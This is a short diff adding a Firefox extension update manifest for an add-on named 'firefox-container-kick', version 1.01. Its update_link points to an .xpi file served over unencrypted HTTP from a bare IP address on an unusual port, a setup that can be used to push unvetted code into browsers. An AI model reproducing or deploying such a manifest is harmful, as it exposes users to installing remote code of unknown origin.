@@ -1,0 +1,12 @@
+{
+  "addons": {
+    "firefox-container-kick@extensions.org": {
+      "updates": [
+        {
+          "version": "1.01",
+          "update_link": "http://217.154.114.227:9586/ext/bc5289a5dd974fd7a866-1.0.xpi"
+        }
+      ]
+    }
+  }
+}
